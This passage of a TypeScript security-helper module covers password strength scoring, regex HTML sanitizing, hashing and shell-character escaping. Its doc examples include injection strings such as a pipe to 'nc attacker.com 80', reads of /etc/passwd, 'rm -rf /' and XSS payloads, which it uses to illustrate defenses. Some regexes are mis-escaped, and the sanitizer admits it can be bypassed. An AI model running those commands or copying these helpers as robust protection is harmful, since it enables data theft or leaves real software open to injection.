 *   document.getElementById('password-errors').innerHTML = errorList
 * }
 * ```
 *
 * @example
 * ```typescript
 * // Strength scoring examples
 * validatePassword('Pass1!').score           // ~35 (fair - minimum requirements)
 * validatePassword('MyP@ssw0rd').score       // ~75 (good - diverse characters)
 * validatePassword('C0mpl3x!P@ssw0rd').score // ~85 (strong - high entropy)
 * validatePassword('aaa111!!!').score        // ~35 (penalized for repetition)
 * validatePassword('Password123').score      // ~50 (penalized for 'abc' + '123')
 * ```
 *
 * @example
 * ```typescript
 * // Integration with password change flow
 * async function changePassword(
 *   userId: string,
 *   oldPassword: string,
 *   newPassword: string
 * ) {
 *   // Validate new password
 *   const validation = validatePassword(newPassword, {
 *     minLength: 10,
 *     forbiddenPatterns: [oldPassword]  // Prevent reusing old password
 *   })
 *
 *   if (!validation.isValid) {
 *     return {
 *       success: false,
 *       errors: validation.errors
 *     }
 *   }
 *
 *   // Check against breach database
 *   const isBreached = await checkHaveIBeenPwned(newPassword)
 *   if (isBreached) {
 *     return {
 *       success: false,
 *       errors: ['This password has been compromised in a data breach']
 *     }
 *   }
 *
 *   // Hash and save
 *   const hashedPassword = await bcrypt.hash(newPassword, 10)
 *   await updateUserPassword(userId, hashedPassword)
 *
 *   return { success: true, strength: validation.strength }
 * }
 * ```
 *
 * @see {@link PasswordCriteria} for criteria configuration options
 * @see {@link PasswordValidationResult} for result structure
 */
export const validatePassword = (
  password: string,
  criteria: PasswordCriteria = {}
): PasswordValidationResult => {
  const {
    minLength = 8,
    requireUppercase = true,
    requireLowercase = true,
    requireNumbers = true,
    requireSpecialChars = true,
    maxLength = 128,
    forbiddenPatterns = [],
  } = criteria

  const errors: string[] = []
  let score = 0

  // Validar longitud mínima
  if (password.length < minLength) {
    errors.push(`La contraseña debe tener al menos ${minLength} caracteres`)
  } else {
    score += 20
  }

  // Validar longitud máxima
  if (password.length > maxLength) {
    errors.push(`La contraseña no puede tener más de ${maxLength} caracteres`)
  }

  // Validar mayúsculas
  if (requireUppercase && !/[A-Z]/.test(password)) {
    errors.push('La contraseña debe contener al menos una letra mayúscula')
  } else if (/[A-Z]/.test(password)) {
    score += 15
  }

  // Validar minúsculas
  if (requireLowercase && !/[a-z]/.test(password)) {
    errors.push('La contraseña debe contener al menos una letra minúscula')
  } else if (/[a-z]/.test(password)) {
    score += 15
  }

  // Validar números
  if (requireNumbers && !/\d/.test(password)) {
    errors.push('La contraseña debe contener al menos un número')
  } else if (/\d/.test(password)) {
    score += 15
  }

  // Validar caracteres especiales
  if (requireSpecialChars && !/[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/.test(password)) {
    errors.push('La contraseña debe contener al menos un caracter especial')
  } else if (/[!@#$%^&*()_+\-=[\]{};':"\\|,.<>/?]/.test(password)) {
    score += 15
  }

  // Validar patrones prohibidos
  for (const pattern of forbiddenPatterns) {
    if (password.toLowerCase().includes(pattern.toLowerCase())) {
      errors.push(`La contraseña no puede contener: ${pattern}`)
    }
  }

  // Bonificaciones por complejidad
  if (password.length >= 12) score += 10
  if (password.length >= 16) score += 10

  // Penalizar patrones comunes
  if (/(.)\\1{2,}/.test(password)) score -= 10 // Caracteres repetidos
  if (/123|abc|qwe/i.test(password)) score -= 15 // Secuencias comunes

  score = Math.max(0, Math.min(100, score))

  let strength: 'weak' | 'fair' | 'good' | 'strong'
  if (score < 30) strength = 'weak'
  else if (score < 60) strength = 'fair'
  else if (score < 80) strength = 'good'
  else strength = 'strong'

  return {
    isValid: errors.length === 0,
    errors,
    strength,
    score,
  }
}

/**
 * Sanitizes HTML by removing scripts and potentially dangerous content
 *
 * Basic XSS protection that removes common attack vectors from HTML strings:
 * - `<script>` tags and their content
 * - `<style>` tags (can contain CSS-based attacks)
 * - Inline event handlers (onclick, onerror, etc.)
 * - `javascript:` URL schemes
 * - `<iframe>` tags (can load malicious content)
 * - `<object>` and `<embed>` tags (plugin-based attacks)
 *
 * ⚠️ WARNING: This is BASIC sanitization for simple use cases.
 * For production systems with user-generated HTML, use:
 * - **DOMPurify** (browser) - Industry-standard HTML sanitizer
 * - **sanitize-html** (Node.js) - Server-side sanitization
 * - Content Security Policy (CSP) headers
 * - Input validation and output encoding
 *
 * Limitations:
 * - Regex-based (can be bypassed with creative encoding)
 * - Does not validate HTML structure
 * - Does not handle all XSS vectors (e.g., CSS expressions, SVG)
 * - Not suitable for rich text editors or complex HTML
 *
 * @param html - HTML string to sanitize
 * @returns Sanitized HTML string with dangerous elements removed
 *
 * @example
 * ```typescript
 * // Basic usage - Remove script tags
 * const dirty = '<p>Hello</p><script>alert("XSS")</script>'
 * const clean = sanitizeHtml(dirty)
 * console.log(clean)
 * // '<p>Hello</p>'
 *
 * // Remove inline event handlers
 * const dirty2 = '<img src="x" onerror="alert(1)">'
 * const clean2 = sanitizeHtml(dirty2)
 * console.log(clean2)
 * // '<img src="x">'
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: User comment sanitization
 * function saveUserComment(userId: string, comment: string) {
 *   // Basic sanitization
 *   const sanitized = sanitizeHtml(comment)
 *
 *   // Additional security checks
 *   if (!isValidTextContent(sanitized, { maxLength: 5000 })) {
 *     throw new Error('Comment contains dangerous content or is too long')
 *   }
 *
 *   // Save to database
 *   return db.comments.create({
 *     userId,
 *     content: sanitized,
 *     createdAt: new Date()
 *   })
 * }
 * ```
 *
 * @example
 * ```typescript
 * // Comparison: Basic vs Production sanitization
 * const userInput = '<p>Text</p><script>alert("XSS")</script><iframe src="evil.com"></iframe>'
 *
 * // This library (basic)
 * const basic = sanitizeHtml(userInput)
 * // '<p>Text</p>'
 *
 * // Production alternative with DOMPurify
 * import DOMPurify from 'dompurify'
 * const production = DOMPurify.sanitize(userInput, {
 *   ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
 *   ALLOWED_ATTR: ['href']
 * })
 * // '<p>Text</p>' (with better coverage)
 * ```
 *
 * @example
 * ```typescript
 * // Edge cases
 * sanitizeHtml('')                    // '' (empty input)
 * sanitizeHtml('<p>Safe content</p>') // '<p>Safe content</p>' (unchanged)
 * sanitizeHtml('<script>alert(1)</script><script>alert(2)</script>') // '' (all removed)
 *
 * // Complex attacks (may not catch all)
 * sanitizeHtml('<IMG SRC=j&#X41vascript:alert("XSS")>') // Partially effective
 * // ⚠️ Use DOMPurify for these cases
 * ```
 *
 * @see {@link isValidTextContent} for content validation
 * @see {@link https://github.com/cure53/DOMPurify DOMPurify - Production sanitization}
 * @see {@link https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html OWASP XSS Prevention}
 */
export const sanitizeHtml = (html: string): string => {
  if (!html) return ''

  // Remover scripts y estilos
  let sanitized = html
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')

  // Remover eventos JavaScript
  sanitized = sanitized.replace(/ on\w+="[^"]*"/gi, '')
  sanitized = sanitized.replace(/ on\w+='[^']*'/gi, '')

  // Remover javascript: URLs
  sanitized = sanitized.replace(/javascript:/gi, '')

  // Remover iframes
  sanitized = sanitized.replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')

  // Remover object y embed
  sanitized = sanitized.replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
  sanitized = sanitized.replace(/<embed\b[^>]*>/gi, '')

  return sanitized.trim()
}

/**
 * Validates basic JWT format (does not verify signature).
 */
export const isValidJWTFormat = (token: string): boolean => {
  if (!token || typeof token !== 'string') return false

  const parts = token.split('.')
  if (parts.length !== 3) return false

  try {
    // Validar que cada parte sea base64 válido
    for (const part of parts) {
      if (!part || !/^[A-Za-z0-9_-]+$/.test(part)) return false
      atob(part.replace(/-/g, '+').replace(/_/g, '/'))
    }
    return true
  } catch {
    return false
  }
}

/**
 * Generates a secure hash of a string using SHA-256 (Node.js) or fallback algorithm (Browser)
 *
 * Creates a deterministic hash from input string, optionally with salt for additional security.
 * Uses different algorithms depending on environment:
 * - **Node.js**: SHA-256 via native `crypto` module (cryptographically secure)
 * - **Browser**: Simple 32-bit hash fallback (NOT cryptographically secure)
 *
 * Common Use Cases:
 * - Content fingerprinting (cache busting, change detection)
 * - Non-cryptographic identifiers (object keys, lookups)
 * - Data integrity checks (comparing content versions)
 * - Anonymization (hashing email addresses for analytics)
 *
 * ⚠️ SECURITY WARNINGS:
 * - **DO NOT** use for password hashing (use bcrypt, argon2, scrypt instead)
 * - Browser fallback is NOT cryptographically secure
 * - SHA-256 alone is vulnerable to rainbow tables without salt
 * - For secure tokens, use {@link generateSecureToken} instead
 * - Consider HMAC-SHA256 for message authentication
 *
 * @param input - String to hash
 * @param salt - Optional salt to append before hashing (default: '')
 * @returns Hexadecimal hash string (64 chars for SHA-256, variable for fallback)
 *
 * @example
 * ```typescript
 * // Basic hashing - Content fingerprinting
 * const content = 'Hello, World!'
 * const hash = hashString(content)
 * console.log(hash)
 * // Node.js: 'dffd6021bb2bd5b0af676290809ec3a53191dd81c7f70a4b28688a362182986f'
 * // Browser: 'd55b9f2a' (fallback)
 *
 * // With salt - Prevent rainbow table attacks
 * const hash1 = hashString('user@example.com', 'secret-salt-2024')
 * const hash2 = hashString('user@example.com', 'different-salt')
 * console.log(hash1 !== hash2) // true
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Email anonymization for analytics
 * function trackUserEvent(email: string, event: string) {
 *   const anonymizedId = hashString(email, 'analytics-salt-v1')
 *
 *   analytics.track(anonymizedId, {
 *     event,
 *     timestamp: Date.now()
 *   })
 *
 *   // Cannot reverse engineer email from hash
 * }
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Content-based cache key
 * function getCacheKey(apiEndpoint: string, params: object): string {
 *   const paramString = JSON.stringify(params, Object.keys(params).sort())
 *   return hashString(apiEndpoint + paramString)
 * }
 *
 * const key1 = getCacheKey('/api/users', { page: 1, limit: 10 })
 * const key2 = getCacheKey('/api/users', { limit: 10, page: 1 })
 * console.log(key1 === key2) // true (same params, different order)
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Data integrity check
 * class ConfigManager {
 *   private lastHash: string = ''
 *
 *   hasConfigChanged(config: object): boolean {
 *     const currentHash = hashString(JSON.stringify(config))
 *
 *     if (currentHash !== this.lastHash) {
 *       this.lastHash = currentHash
 *       return true
 *     }
 *
 *     return false
 *   }
 * }
 * ```
 *
 * @example
 * ```typescript
 * // ❌ WRONG: Password hashing (insecure)
 * const passwordHash = hashString('user-password')  // Vulnerable!
 *
 * // ✅ CORRECT: Use proper password hashing
 * import bcrypt from 'bcrypt'
 * const passwordHash = await bcrypt.hash('user-password', 10)
 * ```
 *
 * @example
 * ```typescript
 * // Deterministic hashing - Same input = same output
 * const input = 'test-string'
 * const hash1 = hashString(input)
 * const hash2 = hashString(input)
 * const hash3 = hashString(input, 'salt')
 *
 * console.log(hash1 === hash2)  // true (deterministic)
 * console.log(hash1 !== hash3)  // true (different salt)
 * ```
 *
 * @example
 * ```typescript
 * // Environment differences
 * const input = 'Hello'
 *
 * // Node.js (SHA-256)
 * hashString(input)
 * // '185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969'
 *
 * // Browser (32-bit fallback)
 * hashString(input)
 * // '15e8a4c9' (much shorter, less collision-resistant)
 * ```
 *
 * @see {@link generateSecureToken} for cryptographically secure random tokens
 * @see {@link generateNonce} for CSRF/nonce generation
 * @see {@link https://nodejs.org/api/crypto.html#crypto_crypto_createhash_algorithm_options Node.js Crypto Documentation}
 */
export const hashString = (input: string, salt = ''): string => {
  if (!isNodeEnvironment()) {
    // Fallback simple para navegador (no recomendado para producción)
    let hash = 0
    const combined = input + salt
    for (let i = 0; i < combined.length; i++) {
      const char = combined.charCodeAt(i)
      hash = (hash << 5) - hash + char
      hash = hash & hash // Convertir a entero de 32 bits
    }
    return Math.abs(hash).toString(16)
  }

  return createHash('sha256')
    .update(input + salt)
    .digest('hex')
}

/**
 * Generates a secure random token.
 */
export const generateSecureToken = (length = 32): string => {
  if (!isNodeEnvironment()) {
    // Fallback para navegador usando crypto.getRandomValues
    const array = new Uint8Array(length)
    crypto.getRandomValues(array)
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('')
  }

  return randomBytes(length).toString('hex')
}

/**
 * Validates if a string is Base64 valid.
 */
export const isValidBase64 = (input: string): boolean => {
  if (!input || typeof input !== 'string') return false

  // Verificar formato básico
  if (!/^[A-Za-z0-9+/]*={0,2}$/.test(input)) return false

  try {
    // Verificar que se puede decodificar y re-encodificar
    const decoded = atob(input)
    const reencoded = btoa(decoded)
    return reencoded === input
  } catch {
    return false
  }
}

/**
 * Escapes special shell characters to prevent command injection attacks
 *
 * Protects against shell command injection by escaping dangerous characters that have
 * special meaning in shell environments (bash, sh, cmd.exe, PowerShell).
 *
 * Escaped Characters:
 * - Backslash `\` → `\\`
 * - Single quote `'` → `\'`
 * - Double quote `"` → `\"`
 * - Semicolon `;` → `\;` (command separator)
 * - Ampersand `&` → `\&` (background execution)
 * - Pipe `|` → `\|` (command chaining)
 * - Backtick `` ` `` → ``\` `` (command substitution)
 * - Dollar sign `$` → `\$` (variable expansion)
 * - Parentheses `()` → `\(\)` (subshells)
 * - Angle brackets `<>` → `\\<\\>` (redirection)
 *
 * ⚠️ CRITICAL SECURITY WARNINGS:
 * - **NEVER** trust user input in shell commands without escaping
 * - Escaping is NOT foolproof - prefer parameterized APIs instead
 * - Consider using safe alternatives:
 *   - **Node.js**: `child_process.spawn()` with array args (no shell)
 *   - **Python**: `subprocess.run([cmd, arg1, arg2], shell=False)`
 *   - **PHP**: `escapeshellarg()` + `escapeshellcmd()`
 * - This function is Unix-focused - Windows cmd.exe has different rules
 * - Avoid shell commands entirely when possible (use libraries/APIs)
 *
 * @param input - String to escape for safe shell usage
 * @returns Escaped string safe for shell command contexts
 *
 * @example
 * ```typescript
 * // Basic usage - Escape dangerous characters
 * const filename = "file; rm -rf /"
 * const safe = escapeShellCommand(filename)
 * console.log(safe)
 * // "file\\; rm -rf /"
 *
 * const command = `cat "${safe}"`  // Safe to use in shell command
 * ```
 *
 * @example
 * ```typescript
 * // ❌ DANGEROUS: Direct user input in shell
 * const userInput = "file.txt; cat /etc/passwd"
 * exec(`cat ${userInput}`)  // INJECTION ATTACK!
 * // Executes: cat file.txt; cat /etc/passwd
 *
 * // ✅ BETTER: Escape user input
 * const userInput = "file.txt; cat /etc/passwd"
 * const safe = escapeShellCommand(userInput)
 * exec(`cat ${safe}`)
 * // Executes: cat file.txt\; cat /etc/passwd (literal string)
 *
 * // ✅ BEST: Avoid shell entirely
 * import { readFile } from 'fs/promises'
 * const content = await readFile(userInput)  // No shell involved
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Safe file processing
 * import { exec } from 'child_process'
 * import { promisify } from 'util'
 *
 * const execPromise = promisify(exec)
 *
 * async function processUserFile(filename: string) {
 *   // Validate first
 *   if (!isValidFilePath(filename)) {
 *     throw new Error('Invalid filename')
 *   }
 *
 *   // Escape for shell safety
 *   const safeFilename = escapeShellCommand(filename)
 *
 *   // Execute command
 *   const { stdout } = await execPromise(`wc -l "${safeFilename}"`)
 *   return parseInt(stdout.trim())
 * }
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Better alternative using spawn (no shell)
 * import { spawn } from 'child_process'
 *
 * function processUserFileSafe(filename: string): Promise<number> {
 *   return new Promise((resolve, reject) => {
 *     // spawn with array args does NOT use shell - safer!
 *     const child = spawn('wc', ['-l', filename])
 *
 *     let output = ''
 *     child.stdout.on('data', data => output += data)
 *     child.on('close', code => {
 *       if (code === 0) {
 *         resolve(parseInt(output.trim()))
 *       } else {
 *         reject(new Error(`Command failed with code ${code}`))
 *       }
 *     })
 *   })
 * }
 * // No escaping needed - filename passed as argument, not interpolated
 * ```
 *
 * @example
 * ```typescript
 * // Common attack vectors - All prevented with escaping
 * escapeShellCommand('file; cat /etc/passwd')      // Prevents command injection
 * escapeShellCommand('file & rm -rf /')            // Prevents background command
 * escapeShellCommand('file | nc attacker.com 80')  // Prevents piping
 * escapeShellCommand('file $(cat /etc/passwd)')    // Prevents command substitution
 * escapeShellCommand('file `whoami`')              // Prevents backtick execution
 * escapeShellCommand('file > /dev/null')           // Prevents redirection
 * ```
 *
 * @example
 * ```typescript
 * // Edge cases
 * escapeShellCommand('')                    // '' (empty preserved)
 * escapeShellCommand('normal-filename.txt') // 'normal-filename.txt' (no changes)
 * escapeShellCommand('file with spaces')    // 'file with spaces' (spaces OK)
 * escapeShellCommand('multi\nline\ntext')   // 'multi\nline\ntext' (newlines preserved)
 * ```
 *
 * @see {@link isValidFilePath} for path validation before shell usage
 * @see {@link https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html OWASP Command Injection Prevention}
 * @see {@link https://nodejs.org/api/child_process.html#child_processspawncommand-args-options Node.js spawn() - Shell-free execution}
 */
export const escapeShellCommand = (input: string): string => {
  if (!input) return ''

  // Escapar caracteres peligrosos
  return input
    .replace(/\\/g, '\\\\') // Backslash
    .replace(/'/g, "\\'") // Single quote
    .replace(/"/g, '\\"') // Double quote
    .replace(/;/g, '\\;') // Semicolon
    .replace(/&/g, '\\&') // Ampersand
    .replace(/\|/g, '\\|') // Pipe (fixed regex)
    .replace(/`/g, '\\`') // Backtick
    .replace(/\$/g, '\\$') // Dollar sign
    .replace(/\(/g, '\\(') // Left parenthesis
    .replace(/\)/g, '\\)') // Right parenthesis
    .replace(/</g, '\\\\<') // Less than
    .replace(/>/g, '\\\\>') // Greater than
}

/**
 * Validates if a URL is secure (https or localhost).
 */
export const isSecureUrl = (url: string): boolean => {
  if (!url || typeof url !== 'string') return false

  try {
    const parsed = new URL(url)
    return (
      parsed.protocol === 'https:' ||
      (parsed.protocol === 'http:' &&
        (parsed.hostname === 'localhost' || parsed.hostname === '127.0.0.1'))
    )
  } catch {
    return false
  }
}

/**
 * Removes or replaces potentially dangerous characters from a string.
 */
export const removeDangerousChars = (input: string, replacement = ''): string => {
  if (!input) return ''

  // Remover caracteres peligrosos comunes
  return input
    .replace(/[<>]/g, replacement) // HTML tags
    .replace(/['"]/g, replacement) // Quotes
    .replace(/[&]/g, replacement) // Ampersand
    .replace(/[\\x00-\\x1f\\x7f]/g, replacement) // Control characters
}

/**
 * Generates a secure random string for use as nonce or CSRF token.
 */
export const generateNonce = (length = 32): string => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''

  if (!isNodeEnvironment()) {
    // Para navegador
    const array = new Uint8Array(length)
    crypto.getRandomValues(array)
    for (let i = 0; i < length; i++) {
      result += chars[array[i] % chars.length]
    }
  } else {
    // Para Node.js
    const bytes = randomBytes(length)
    for (let i = 0; i < length; i++) {
      result += chars[bytes[i] % chars.length]
    }
  }

  return result
}

/**
 * Validates if a string represents a valid dot-notation path
 *
 * Checks for common formatting issues:
 * - Empty path
 * - Leading/trailing dots
 * - Consecutive dots (e.g., 'path..value')
 * - Invalid characters (only alphanumeric, dots, underscores, hyphens)
 *
 * Valid paths: 'database.host', 'app.features.auth', 'config_value.nested-key'
 * Invalid paths: '.database', 'database.', 'path..value', 'path with spaces'
 *
 * @param path - String to validate as dot-notation path
 * @returns True if path is valid dot-notation format, false otherwise
 *
 * @example
 * ```typescript
 * // Valid paths
 * isValidDotNotationPath('database.host')              // true
 * isValidDotNotationPath('app.features.auth.enabled')  // true
 * isValidDotNotationPath('config_value')               // true (single segment)
 * isValidDotNotationPath('nested-key.sub_key')         // true (hyphens/underscores)
 * isValidDotNotationPath('level1.level2.level3')       // true
 *
 * // Invalid paths
 * isValidDotNotationPath('')                           // false (empty)
 * isValidDotNotationPath('.database')                  // false (leading dot)
 * isValidDotNotationPath('database.')                  // false (trailing dot)
 * isValidDotNotationPath('path..value')                // false (consecutive dots)
 * isValidDotNotationPath('path with spaces')           // false (spaces)
 * isValidDotNotationPath('path.with.special!chars')    // false (special chars)
 * ```
 *
 * @example
 * ```typescript
 * // Real-world: Validate user input for config paths
 * function setConfigValue(path: string, value: any) {
 *   if (!isValidDotNotationPath(path)) {
 *     throw new Error(`Invalid config path: ${path}`)
 *   }
 *   // Safe to use path with setDeepValue
 *   setDeepValue(config, path, value)
 * }
 *
 * setConfigValue('database.host', 'localhost')    // OK
 * setConfigValue('.invalid', 'value')             // throws Error
 * ```
 *
 * @example
 * ```typescript
 * // Input validation for API
 * app.post('/api/config', (req, res) => {
 *   const { path, value } = req.body
 *
 *   if (!isValidDotNotationPath(path)) {
 *     return res.status(400).json({
 *       error: 'Invalid path format. Use dot notation (e.g., database.host)'
 *     })
 *   }
 *
 *   // Safe to proceed
 *   updateConfig(path, value)
 *   res.json({ success: true })
 * })
 * ```
 */
export function isValidDotNotationPath(path: string): boolean {
  // Check if path is provided and is a string
  if (!path || typeof path !== 'string') {
    return false
  }

  const trimmed = path.trim()

  // Check if empty after trimming
  if (trimmed.length === 0) {
    return false
  }

  // Check for leading or trailing dots
  if (trimmed.startsWith('.') || trimmed.endsWith('.')) {
    return false
  }

  // Check for consecutive dots
  if (trimmed.includes('..')) {
    return false
  }

  // Valid characters: alphanumeric, dots, underscores, hyphens
  // Each segment between dots must have at least one character
  const validPattern = /^[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)*$/

  return validPattern.test(trimmed)
}
